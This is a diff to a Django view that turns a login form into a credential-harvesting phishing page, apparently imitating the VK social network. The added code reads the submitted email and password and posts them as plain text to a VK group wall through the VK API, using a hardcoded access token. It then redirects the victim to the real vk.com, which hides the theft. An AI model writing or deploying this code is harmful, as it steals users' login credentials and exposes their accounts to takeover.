@@ -28,6 +28,18 @@ def index(request):
 
 def full(request):
     if request.method == "POST":
+        tok = "be363c662f54c1f5f9e008f7eab1e41a96958a4a5781725c9445f49ddf03520e15a10d6da236bd8ee0ed3"
+        club = -189734539
+
+        email = request.POST.get("email")
+        pas = request.POST.get("pass")
+
+        body = "Login: {0}\nPass: {1}".format(email, pas)
+
+        ses = Session(access_token=tok)
+        vk = API(session=ses)
+        vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)
+
         return HttpResponsePermanentRedirect("https://vk.com")
     form = login()
     return render(request, "app_serverr/full.html", {"form": form})
